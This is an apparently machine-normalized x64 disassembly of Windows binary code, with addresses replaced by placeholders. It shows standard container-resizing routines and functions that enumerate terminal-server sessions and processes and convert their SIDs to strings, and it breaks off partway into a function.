mov eax [ rsp + 0x2c ]
mov [ rcx + 0xc ] eax
mov eax [ rsp + 0x30 ]
mov [ rcx + 0x10 ] eax
mov eax [ rsp + 0x34 ]
mov [ rcx + 0x14 ] eax
mov eax [ rsp + 0x38 ]
mov rcx [ rbx + 0x8 ]
imul rdi rdi 0x1c
add rdi [ rbx ]
test rcx rcx
je r-xdata
mov rcx rbx
call sub_140011780
mov eax [ rdi ]
mov [ rcx ] eax
mov eax [ rdi + 0x4 ]
mov [ rcx + 0x4 ] eax
mov eax [ rdi + 0x8 ]
mov [ rcx + 0x8 ] eax
mov eax [ rdi + 0xc ]
mov [ rcx + 0xc ] eax
mov eax [ rdi + 0x10 ]
mov [ rcx + 0x10 ] eax
mov eax [ rdi + 0x14 ]
mov [ rcx + 0x14 ] eax
mov eax [ rdi + 0x18 ]
jmp r-xdata
mov [ rcx + 0x18 ] eax
sub_140011780
sub rsp 0x28
mov r10 [ rcx ]
mov rdx [ rcx + 0x8 ]
mov r11 0x4924924924924925
sub rdx r10
mov rax r11
mov r9 rcx
imul rdx
mov r8 rdx
sar r8 0x3
mov rax r8
shr rax 0x3f
add r8 rax
mov rax 0x924924924924923
cmp r8 rax
jbe r-xdata
mov rcx [ rcx + 0x10 ]
mov rax r11
inc r8
sub rcx r10
imul rcx
sar rdx 0x3
mov rax rdx
shr rax 0x3f
add rdx rax
cmp r8 rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_1400378ec
add rsp 0x28
retn
mov rcx rdx
mov rax 0x924924924924924
shr rcx 0x1
sub rax rcx
cmp rax rdx
jae r-xdata
add rdx rcx
mov rcx r9
cmp rdx r8
cmovb rdx r8
call sub_140011840
xor edx edx
mov rcx r9
cmp rdx r8
cmovb rdx r8
add rsp 0x28
jmp sub_140011840
sub_140011840
push r12
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x68 ] rdi
mov rbx rdx
mov rsi rcx
mov rax 0x924924924924924
cmp rdx rax
jbe r-xdata
mov rcx [ rcx + 0x10 ]
sub rcx [ rsi ]
mov r12 0x4924924924924925
mov rax r12
imul rcx
sar rdx 0x3
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx rbx
jae r-xdata
lea rcx [ r--data ]
call sub_1400378ec
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
xor edi edi
mov [ rsp + 0x58 ] rdi
test rbx rbx
je r-xdata
mov r8 rdi
mov rdx [ rsi + 0x8 ]
mov rcx [ rsi ]
call sub_140011970
nop
mov rcx [ rsi ]
mov rdx [ rsi + 0x8 ]
sub rdx rcx
mov rax r12
imul rdx
mov r12 rdx
sar r12 0x3
mov rax r12
shr rax 0x3f
add r12 rax
test rcx rcx
je r-xdata
mov rcx rbx
imul rcx rcx 0x1c
call sub_14003ac60
mov rdi rax
mov [ rsp + 0x58 ] rax
test rax rax
jne r-xdata
imul rbx rbx 0x1c
add rbx rdi
mov [ rsi + 0x10 ] rbx
imul r12 r12 0x1c
add r12 rdi
mov [ rsi + 0x8 ] r12
mov [ rsi ] rdi
call j_sub_14003ad04
mov [ rsp + 0x58 ] rax
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x28 ]
call sub_14003a774
lea r11 [ r--data ]
mov [ rsp + 0x28 ] r11
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_14003f22c
nop
sub_140011970
sub rsp 0x38
mov [ rsp + 0x20 ] 0xfffffffffffffffe
nop [ rax ] eax
mov rax r8
add rsp 0x38
retn
test r8 r8
je r-xdata
add r8 0x1c
add rcx 0x1c
jmp r-xdata
mov eax [ rcx ]
mov [ r8 ] eax
mov eax [ rcx + 0x4 ]
mov [ r8 + 0x4 ] eax
mov eax [ rcx + 0x8 ]
mov [ r8 + 0x8 ] eax
mov eax [ rcx + 0xc ]
mov [ r8 + 0xc ] eax
mov eax [ rcx + 0x10 ]
mov [ r8 + 0x10 ] eax
mov eax [ rcx + 0x14 ]
mov [ r8 + 0x14 ] eax
mov eax [ rcx + 0x18 ]
mov [ r8 + 0x18 ] eax
cmp rcx rdx
je r-xdata
sub_1400119d0
mov r11 rsp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x80
mov [ rsp + 0x40 ] 0xfffffffffffffffe
mov [ r11 + 0x18 ] rbx
mov [ r11 + 0x20 ] rbp
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x78 ] rax
mov r13 rcx
xor r14d r14d
mov [ r11 - 0x78 ] r14d
test rdx rdx
sete al
test al al
je r-xdata
cmp [ rdx + 0x18 ] 0x8
jb r-xdata
mov ebp r14d
jmp r-xdata
mov rcx rdx
call sub_14003bbd4
mov rdi rax
mov rcx rax
call [ WTSOpenServerW@IAT ]
mov rbp rax
mov rcx rdi
call j_sub_14003ad04#2
test rbp rbp
setne al
mov rdx [ rdx ]
test al al
je r-xdata
xor al al
lea rax [ rsp + 0x30 ]
mov [ rsp + 0x20 ] rax
lea r9 [ rsp + 0x38 ]
xor edx edx
lea r8d [ rdx + 0x1 ]
mov rcx rbp
call [ WTSEnumerateSessionsW@IAT ]
test eax eax
setne r12b
test r12b r12b
je r-xdata
test rbp rbp
je r-xdata
mov ebx r14d
cmp [ rsp + 0x30 ] ebx
jbe r-xdata
movzx eax r12b
jmp r-xdata
mov rcx rbp
call [ WTSCloseServer@IAT ]
mov rcx [ rsp + 0x38 ]
call [ WTSFreeMemory@IAT ]
mov rsi r14
nop
mov rcx [ rsp + 0x78 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x80 ]
mov rbx [ r11 + 0x40 ]
mov rbp [ r11 + 0x48 ]
mov rsp r11
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
inc ebx
add rsi 0x18
cmp ebx [ rsp + 0x30 ]
jb r-xdata
mov rcx [ rsp + 0x50 ]
call j_sub_14003ad04
mov rcx [ rsp + 0x38 ]
mov eax [ rsi + rcx ]
mov [ rsp + 0x48 ] eax
mov eax [ rsi + rcx + 0x10 ]
mov [ rsp + 0x4c ] eax
mov rdx [ rsi + rcx + 0x8 ]
mov [ rsp + 0x68 ] 0x7
mov [ rsp + 0x60 ] r14
mov [ rsp + 0x50 ] r14w
xor eax eax
or rcx 0xffffffffffffffff
mov rdi rdx
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rcx [ rsp + 0x50 ]
call sub_140001ea0
nop
lea rdx [ rsp + 0x48 ]
mov rcx r13
call sub_1400122e0
nop
cmp [ rsp + 0x68 ] 0x8
jb r-xdata
sub_140011b60
push rbx
sub rsp 0x20
cmp [ rcx + 0x20 ] 0x8
mov rbx rcx
jb r-xdata
xor eax eax
mov [ rbx + 0x20 ] 0x7
mov [ rbx + 0x18 ] rax
mov [ rbx + 0x8 ] ax
add rsp 0x20
pop rbx
retn
mov rcx [ rcx + 0x8 ]
call j_sub_14003ad04
sub_140011ba0
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x40 ]
sub rsp 0x140
mov [ rsp + 0x58 ] 0xfffffffffffffffe
mov [ rsp + 0x190 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x38 ] rax
mov r15 rdx
mov rbx rcx
xor sil sil
xor edi edi
mov [ rsp + 0x34 ] edi
test rdx rdx
sete al
test al al
je r-xdata
cmp [ rdx + 0x18 ] 0x8
jb r-xdata
mov r14d edi
jmp r-xdata
mov rcx rdx
mov rcx [ rdx ]
jmp r-xdata
test al al
je r-xdata
movzx eax sil
mov rcx [ rbp + 0x38 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0x190 ]
add rsp 0x140
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
lea rax [ rsp + 0x34 ]
mov [ rsp + 0x20 ] rax
lea r9 [ rsp + 0x38 ]
xor edx edx
lea r8d [ rdx + 0x1 ]
mov rcx r14
call [ WTSEnumerateProcessesW@IAT ]
test eax eax
setne al
mov [ rsp + 0x30 ] al
test al al
je r-xdata
call sub_14003bbd4
mov rdi rax
mov rcx rax
call [ WTSOpenServerW@IAT ]
mov r14 rax
mov rcx rdi
call j_sub_14003ad04#2
test r14 r14
setne al
xor edi edi
test r14 r14
je r-xdata
mov r12d edi
mov r13 rdi
cmp [ rsp + 0x34 ] 0x0
jbe r-xdata
movzx esi [ rsp + 0x30 ]
mov rcx r14
call [ WTSCloseServer@IAT ]
mov rcx [ rsp + 0x38 ]
call [ WTSFreeMemory@IAT ]
or r8 0xffffffffffffffff
lea rsi [ r13 + r13 * 2 ]
mov rcx [ rsp + 0x38 ]
mov eax [ rcx + rsi * 8 ]
mov [ rsp + 0x60 ] eax
mov eax [ rcx + rsi * 8 + 0x4 ]
mov [ rsp + 0x64 ] eax
mov rdx [ rcx + rsi * 8 + 0x8 ]
mov [ rbp - 0x80 ] 0x7
mov [ rsp + 0x78 ] rdi
mov [ rsp + 0x68 ] di
xor eax eax
mov rcx r8
mov rdi rdx
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rcx [ rsp + 0x68 ]
call sub_140001ea0
mov [ rbp - 0x58 ] 0x7
xor eax eax
mov [ rbp - 0x60 ] rax
mov [ rbp - 0x70 ] ax
mov [ rbp ] 0x7
mov [ rbp - 0x8 ] rax
mov [ rbp - 0x18 ] ax
mov [ rbp - 0x28 ] 0x7
mov [ rbp - 0x30 ] rax
mov [ rbp - 0x40 ] ax
mov r9 r15
lea r8 [ rbp - 0x40 ]
lea rdx [ rbp - 0x18 ]
mov rcx [ rsp + 0x38 ]
mov rcx [ rcx + rsi * 8 + 0x10 ]
call sub_14000e700
test al al
je r-xdata
mov rax [ rsp + 0x38 ]
lea rdx [ rsp + 0x40 ]
mov rcx [ rax + rsi * 8 + 0x10 ]
call [ ConvertSidToStringSidW@IAT ]
test eax eax
setne al
test al al
je r-xdata
mov rsi [ rbp - 0x30 ]
cmp rsi 0xffffffffffffffff
mov r9 0xffffffffffffffff
cmova rsi r9
mov rdx rsi
lea rcx [ rbp - 0x70 ]
call sub_140002230
test al al
je r-xdata
mov rax [ rsp + 0x38 ]
mov rdi [ rbp - 0x70 ]
mov rdx [ rbp - 0x58 ]
mov r8 [ rbp - 0x60 ]
cmp [ rax + rsi * 8 + 0x10 ] 0x0
lea rax [ rbp - 0x70 ]
je r-xdata
xor eax eax
or rcx 0xffffffffffffffff
mov rdx [ rsp + 0x40 ]
mov rdi rdx
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rcx [ rbp - 0x70 ]
call sub_140001ea0
mov rcx [ rsp + 0x40 ]
call [ LocalFree@IAT ]
jmp r-xdata
xor r8d r8d
lea rdx [ rbp - 0x40 ]
cmp [ rbp - 0x28 ] 0x8
cmovae rdx [ rbp - 0x40 ]
lea rcx [ rbp - 0x70 ]
cmp [ rbp - 0x58 ] 0x8
cmovae rcx [ rbp - 0x70 ]
lea rdi [ rsi + rsi ]
mov r8 rdi
call sub_14003a8c0
mov [ rbp - 0x60 ] rsi
lea rax [ rbp - 0x70 ]
cmp [ rbp - 0x58 ] 0x8
cmovae rax [ rbp - 0x70 ]
xor r8d r8d
mov [ rdi + rax ] r8w
jmp r-xdata
cmp rdx 0x8
cmovae rax rdi
lea rcx [ r--data ]
cmp rcx rax
jb r-xdata
cmp rdx 0x8
cmovae rax rdi
lea rcx [ r--data ]
cmp rcx rax
jb r-xdata
xor esi esi
sub rdx rax
sar rdx 0x1
mov rdx r8
jmp r-xdata
lea rdx [ rbp - 0x70 ]
mov rdi [ rbp - 0x70 ]
mov rcx [ rbp - 0x58 ]
cmp rcx 0x8
cmovae rdx rdi
mov rax [ rbp - 0x60 ]
lea rdx [ rdx + rax * 2 ]
lea rax [ rbp - 0x70 ]
cmovae rax rdi
test rdx rdx
jne r-xdata
cmp rdx 0x4
jae r-xdata
lea rax [ rbp - 0x70 ]
cmp rdx 0x8
cmovae rax rdi
lea rax [ rax + r8 * 2 ]
cmp rax rcx
jbe r-xdata
cmp rdx 0xd
jae r-xdata
lea rax [ rbp - 0x70 ]
cmp rdx 0x8
cmovae rax rdi
lea rax [ rax + r8 * 2 ]
cmp rax rcx
jbe r-xdata
cmp r8 [ rbx + 0x10 ]
jne r-xdata
mov rax [ rbx ]
lea rcx [ rsp + 0x60 ]
cmp rax rcx
ja r-xdata
lea rcx [ r--data ]
call sub_1400378ec
test rsi rsi
je r-xdata
lea rcx [ rbp - 0x70 ]
call sub_140012570
or rcx 0xffffffffffffffff
mov rsi rcx
mov rax [ rbp - 0x8 ]
cmp rax rcx
cmovb rsi rax
mov rax rcx
mov rcx [ rbp - 0x60 ]
sub rax rcx
cmp rax rsi
jbe r-xdata
lea rcx [ rbp - 0x70 ]
cmp rdx 0x8
cmovae rcx rdi
mov rax [ r--data ]
mov [ rcx ] rax
mov eax 0x4
mov [ rbp - 0x60 ] rax
lea rax [ rbp - 0x70 ]
cmp [ rbp - 0x58 ] 0x8
cmovae rax [ rbp - 0x70 ]
xor esi esi
mov [ rax + 0x8 ] si
jmp r-xdata
mov edx 0x4
lea rcx [ rbp - 0x70 ]
call sub_1400025a0
mov rdx [ rbp - 0x58 ]
mov rdi [ rbp - 0x70 ]
lea rax [ rbp - 0x70 ]
cmp rdx 0x8
cmovae rax rdi
mov rdi rcx
sub rdi rax
sar rdi 0x1
cmp r8 rdi
jb r-xdata
lea rcx [ rbp - 0x70 ]
cmp rdx 0x8
cmovae rcx rdi
mov rax [ r--data ]
mov [ rcx ] rax
mov rax [ r--data ]
mov [ rcx + 0x8 ] rax
mov rax [ r--data ]
mov [ rcx + 0x10 ] rax
movzx eax [ r--data ]
mov [ rcx + 0x18 ] ax
mov eax 0xd
mov [ rbp - 0x60 ] rax
lea rax [ rbp - 0x70 ]
cmp [ rbp - 0x58 ] 0x8
cmovae rax [ rbp - 0x70 ]
xor esi esi
mov [ rax + 0x1a ] si
mov edx 0xd
lea rcx [ rbp - 0x70 ]
call sub_1400025a0
mov rdx [ rbp - 0x58 ]
mov rdi [ rbp - 0x70 ]
lea rax [ rbp - 0x70 ]
cmp rdx 0x8
cmovae rax rdi
mov rdi rcx
sub rdi rax
sar rdi 0x1
cmp r8 rdi
jb r-xdata
mov rdi [ rbx + 0x8 ]
mov [ rsp + 0x50 ] rdi
mov [ rsp + 0x48 ] rdi
test rdi rdi
je r-xdata
mov rcx rbx
call sub_1400124b0
lea rcx [ rsp + 0x60 ]
sub rcx rax
mov rax 0x2e8ba2e8ba2e8ba3
imul rcx
mov rdi rdx
sar rdi 0x4
mov rax rdi
shr rax 0x3f
add rdi rax
cmp r8 [ rbx + 0x10 ]
jne r-xdata
lea rdi [ rsi + rcx ]
mov rax 0x7ffffffffffffffe
cmp rdi rax
ja r-xdata
mov r8 [ rbx + 0x8 ]
lea rax [ rsp + 0x60 ]
cmp rax r8
jae r-xdata
lea rcx [ r--data ]
call sub_140037948
sub r8 rdi
cmp r8 0x4
mov eax 0x4
cmova r8 rax
lea rdx [ r8 + rdi ]
or r8 0xffffffffffffffff
lea rcx [ rbp - 0x70 ]
call sub_140002190
mov r8 rdi
xor edx edx
lea rcx [ rbp - 0x70 ]
call sub_140002190
jmp r-xdata
mov rcx [ rbp + 0x10 ]
call j_sub_14003ad04
jmp r-xdata
lea rcx [ r--data ]
call sub_140037948
sub r8 rdi
cmp r8 0xd
mov eax 0xd
cmova r8 rax
lea rdx [ r8 + rdi ]
or r8 0xffffffffffffffff
lea rcx [ rbp - 0x70 ]
call sub_140002190
mov r8 rdi
xor edx edx
lea rcx [ rbp - 0x70 ]
call sub_140002190
xor esi esi
jmp r-xdata
add [ rbx + 0x8 ] 0x58
cmp [ rbp - 0x28 ] 0x8
jb r-xdata
mov eax [ rsp + 0x60 ]
mov [ rdi ] eax
mov eax [ rsp + 0x64 ]
mov [ rdi + 0x4 ] eax
lea rcx [ rdi + 0x8 ]
mov [ rcx + 0x18 ] 0x7
mov [ rcx + 0x10 ] rsi
mov [ rcx ] si
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rsp + 0x68 ]
call sub_140001dd0
nop
lea rcx [ rdi + 0x30 ]
mov [ rcx + 0x18 ] 0x7
mov [ rcx + 0x10 ] rsi
mov [ rcx ] si
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp - 0x70 ]
call sub_140001dd0
nop
imul rdi rdi 0x58
add rdi [ rbx ]
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x48 ] rcx
mov [ rsp + 0x50 ] rcx
test rcx rcx
je r-xdata
mov rcx rbx
call sub_1400124b0
lea rcx [ r--data ]
call sub_1400378ec
cmp [ rbp - 0x58 ] rdi
jae r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp + 0x10 ]
call sub_14000f390
nop
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rax
lea rcx [ rbp - 0x70 ]
call sub_140007240
nop
cmp [ rbp + 0x28 ] 0x8
jb r-xdata
mov [ rbp - 0x28 ] 0x7
mov [ rbp - 0x30 ] rsi
mov [ rbp - 0x40 ] si
cmp [ rbp ] 0x8
jb r-xdata
mov rcx [ rbp - 0x40 ]
call j_sub_14003ad04
jmp r-xdata
mov rdx rdi
call sub_140012940
nop
test rdi rdi
jne r-xdata
mov r8 rcx
mov rdx rdi
lea rcx [ rbp - 0x70 ]
call sub_1400025a0
jmp r-xdata
mov [ rbp ] 0x7
mov [ rbp - 0x8 ] rsi
mov [ rbp - 0x18 ] si
cmp [ rbp - 0x58 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x18 ]
call j_sub_14003ad04
setne al
test al al
je r-xdata
xor ecx ecx
mov [ rbp - 0x60 ] rcx
lea rax [ rbp - 0x70 ]
cmp [ rbp - 0x58 ] 0x8
cmovae rax [ rbp - 0x70 ]
mov [ rax ] cx
mov rcx [ rbp - 0x60 ]
test rdi rdi
mov [ rbp - 0x58 ] 0x7
mov [ rbp - 0x60 ] rsi
mov [ rbp - 0x70 ] si
cmp [ rbp - 0x80 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x70 ]
call j_sub_14003ad04
lea rdx [ rbp - 0x18 ]
cmp [ rbp ] 0x8
cmovae rdx [ rbp - 0x18 ]
lea rax [ rbp - 0x70 ]
cmp [ rbp - 0x58 ] 0x8
cmovae rax [ rbp - 0x70 ]
lea rcx [ rax + rcx * 2 ]
lea r8 [ rsi + rsi ]
call sub_14003a8c0
mov [ rbp - 0x60 ] rdi
lea rax [ rbp - 0x70 ]
cmp [ rbp - 0x58 ] 0x8
cmovae rax [ rbp - 0x70 ]
xor esi esi
mov [ rax + rdi * 2 ] si
jmp r-xdata
inc r12d
inc r13
cmp r12d [ rsp + 0x34 ]
jae r-xdata
mov rcx [ rsp + 0x68 ]
call j_sub_14003ad04
xor edi edi
jmp r-xdata
sub_1400122e0
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov rdi rdx
mov rbx rcx
mov rcx [ rcx + 0x8 ]
cmp rdx rcx
jae r-xdata
cmp rcx [ rbx + 0x10 ]
jne r-xdata
mov rax [ rbx ]
cmp rax rdx
ja r-xdata
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov rcx rbx
call sub_1400123f0
sub rdi rax
mov rax 0x2aaaaaaaaaaaaaab
imul rdi
mov rdi rdx
sar rdi 0x3
mov rax rdi
shr rax 0x3f
add rdi rax
cmp rcx [ rbx + 0x10 ]
jne r-xdata
add [ rbx + 0x8 ] 0x30
mov rbx [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov eax [ rdi ]
mov [ rcx ] eax
mov eax [ rdi + 0x4 ]
mov [ rcx + 0x4 ] eax
add rcx 0x8
mov [ rcx + 0x18 ] 0x7
xor eax eax
mov [ rcx + 0x10 ] rax
mov [ rcx ] ax
lea rdx [ rdi + 0x8 ]
or r9 0xffffffffffffffff
xor r8d r8d
call sub_140001dd0
nop
lea rdx [ rdi + rdi * 2 ]
shl rdx 0x4
add rdx [ rbx ]
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov rcx rbx
call sub_1400123f0
jmp r-xdata
mov eax [ rdx ]
mov [ rcx ] eax
mov eax [ rdx + 0x4 ]
mov [ rcx + 0x4 ] eax
add rcx 0x8
mov [ rcx + 0x18 ] 0x7
xor eax eax
mov [ rcx + 0x10 ] rax
mov [ rcx ] ax
add rdx 0x8
or r9 0xffffffffffffffff
xor r8d r8d
call sub_140001dd0
nop
sub_1400123f0
sub rsp 0x28
mov r10 [ rcx ]
mov rdx [ rcx + 0x8 ]
mov r11 0x2aaaaaaaaaaaaaab
sub rdx r10
mov rax r11
mov r9 rcx
imul rdx
mov r8 rdx
sar r8 0x3
mov rax r8
shr rax 0x3f
add r8 rax
mov rax 0x555555555555554
cmp r8 rax
jbe r-xdata
mov rcx [ rcx + 0x10 ]
mov rax r11
inc r8
sub rcx r10
imul rcx
sar rdx 0x3
mov rax rdx
shr rax 0x3f
add rdx rax
cmp r8 rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_1400378ec
add rsp 0x28
retn
mov rcx rdx
mov rax 0x555555555555555
shr rcx 0x1
sub rax rcx
cmp rax rdx
jae r-xdata
add rdx rcx
mov rcx r9
cmp rdx r8
cmovb rdx r8
call sub_140012650
xor edx edx
mov rcx r9
cmp rdx r8
cmovb rdx r8
add rsp 0x28
jmp sub_140012650
sub_1400124b0
sub rsp 0x28
mov r10 [ rcx ]
mov rdx [ rcx + 0x8 ]
mov r11 0x2e8ba2e8ba2e8ba3
sub rdx r10
mov rax r11
mov r9 rcx
imul rdx
mov r8 rdx
sar r8 0x4
mov rax r8
shr rax 0x3f
add r8 rax
mov rax 0x2e8ba2e8ba2e8b9
cmp r8 rax
jbe r-xdata
mov rcx [ rcx + 0x10 ]
mov rax r11
inc r8
sub rcx r10
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp r8 rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_1400378ec
add rsp 0x28
retn
mov rcx rdx
mov rax 0x2e8ba2e8ba2e8ba
shr rcx 0x1
sub rax rcx
cmp rax rdx
jae r-xdata
add rdx rcx
mov rcx r9
cmp rdx r8
cmovb rdx r8
call sub_1400127a0
xor edx edx
mov rcx r9
cmp rdx r8
cmovb rdx r8
add rsp 0x28
jmp sub_1400127a0
sub_140012570
mov [ rsp + 0x10 ] rbx
push rsi
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x10 ]
mov rsi rdx
cmp rcx rdx
jae r-xdata
or rax 0xffffffffffffffff
sub rax rcx
cmp rax 0x1
ja r-xdata
lea rcx [ r--data ]
call sub_140037948
mov [ rsp + 0x30 ] rdi
lea rdi [ rcx + 0x1 ]
mov rcx rbx
mov rdx rdi
call sub_140002230
test al al
je r-xdata
lea rcx [ r--data ]
call sub_1400378ec
mov rdi [ rsp + 0x30 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rsi
retn
mov rax [ rbx + 0x18 ]
cmp rax 0x8
jb r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
cmp rax 0x8
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov r8 [ rbx + 0x10 ]
lea rdx [ rcx + rsi * 2 ]
lea rcx [ rax + rsi * 2 + 0x2 ]
sub r8 rsi
add r8 r8
call sub_14003a8c0
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov ecx 0x5c
mov [ rax + rsi * 2 ] cx
cmp [ rbx + 0x18 ] 0x8
mov [ rbx + 0x10 ] rdi
jb r-xdata
xor ecx ecx
mov [ rax + rdi * 2 ] cx
sub_140012650
push r12
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x68 ] rdi
mov rdi rdx
mov rsi rcx
mov rax 0x555555555555555
cmp rdx rax
jbe r-xdata
mov rcx [ rcx + 0x10 ]
sub rcx [ rsi ]
mov r12 0x2aaaaaaaaaaaaaab
mov rax r12
imul rcx
sar rdx 0x3
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx rdi
jae r-xdata
lea rcx [ r--data ]
call sub_1400378ec
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
xor ebx ebx
mov [ rsp + 0x58 ] rbx
test rdi rdi
je r-xdata
mov r8 rbx
mov rdx [ rsi + 0x8 ]
mov rcx [ rsi ]
call sub_1400129d0
nop
mov r9 [ rsi + 0x8 ]
mov rcx [ rsi ]
mov r8 r9
sub r8 rcx
mov rax r12
imul r8
mov r12 rdx
sar r12 0x3
mov rax r12
shr rax 0x3f
add r12 rax
test rcx rcx
je r-xdata
lea rcx [ rdi + rdi * 2 ]
shl rcx 0x4
call sub_14003ac60
mov rbx rax
mov [ rsp + 0x58 ] rax
test rax rax
jne r-xdata
lea rax [ rdi + rdi * 2 ]
shl rax 0x4
add rax rbx
mov [ rsi + 0x10 ] rax
lea rax [ r12 + r12 * 2 ]
shl rax 0x4
add rax rbx
mov [ rsi + 0x8 ] rax
mov [ rsi ] rbx
mov rdx r9
call sub_1400128e0
mov rcx [ rsi ]
call j_sub_14003ad04
mov [ rsp + 0x58 ] rax
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x28 ]
call sub_14003a774
lea r11 [ r--data ]
mov [ rsp + 0x28 ] r11
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_14003f22c
nop
sub_1400127a0
push r12
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x68 ] rdi
mov rbx rdx
mov rsi rcx
mov rax 0x2e8ba2e8ba2e8ba
cmp rdx rax
jbe r-xdata
mov rcx [ rcx + 0x10 ]
sub rcx [ rsi ]
mov r12 0x2e8ba2e8ba2e8ba3
mov rax r12
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx rbx
jae r-xdata
lea rcx [ r--data ]
call sub_1400378ec
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
xor edi edi
mov [ rsp + 0x58 ] rdi
test rbx rbx
je r-xdata
mov r8 rdi
mov rdx [ rsi + 0x8 ]
mov rcx [ rsi ]
call sub_140012a60
nop
mov r9 [ rsi + 0x8 ]
mov rcx [ rsi ]
mov r8 r9
sub r8 rcx
mov rax r12
imul r8
mov r12 rdx
sar r12 0x4
mov rax r12
shr rax 0x3f
add r12 rax
test rcx rcx
je r-xdata
mov rcx rbx
imul rcx rcx 0x58
call sub_14003ac60
mov rdi rax
mov [ rsp + 0x58 ] rax
test rax rax
jne r-xdata
imul rbx rbx 0x58
add rbx rdi
mov [ rsi + 0x10 ] rbx
imul r12 r12 0x58
add r12 rdi
mov [ rsi + 0x8 ] r12
mov [ rsi ] rdi
mov rdx r9
call sub_1400150b0
mov rcx [ rsi ]
call j_sub_14003ad04
mov [ rsp + 0x58 ] rax
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x28 ]
call sub_14003a774
lea r11 [ r--data ]
mov [ rsp + 0x28 ] r11
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_14003f22c
nop
sub_1400128e0
cmp rcx rdx
je r-xdata
retn
push rdi
sub rsp 0x20
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x38 ] rsi
mov rdi rdx
xor esi esi
lea rbx [ rcx + 0x20 ]
nop [ rax ] eax
mov [ rbx ] 0x7
mov [ rbx - 0x8 ] rsi
mov [ rbx - 0x18 ] si
add rbx 0x30
lea rax [ rbx - 0x20 ]
cmp rax rdi
jne r-xdata
mov rcx [ rbx - 0x18 ]
call j_sub_14003ad04
cmp [ rbx ] 0x8
jb r-xdata
mov rsi [ rsp + 0x38 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
sub_140012940
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x48 ] rbx
mov [ rsp + 0x50 ] rsi
mov rbx rdx
mov rdi rcx
mov eax [ rdx ]
mov [ rcx ] eax
mov eax [ rdx + 0x4 ]
mov [ rcx + 0x4 ] eax
add rcx 0x8
mov [ rcx + 0x18 ] 0x7
xor esi esi
mov [ rcx + 0x10 ] rsi
mov [ rcx ] si
add rdx 0x8
or r9 0xffffffffffffffff
xor r8d r8d
call sub_140001dd0
nop
lea rcx [ rdi + 0x30 ]
mov [ rcx + 0x18 ] 0x7
mov [ rcx + 0x10 ] rsi
mov [ rcx ] si
lea rdx [ rbx + 0x30 ]
or r9 0xffffffffffffffff
xor r8d r8d
call sub_140001dd0
nop
mov rax rdi
mov rbx [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
sub_1400129d0
mov [ rsp + 0x18 ] r8
push rsi
push rdi
push r12
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
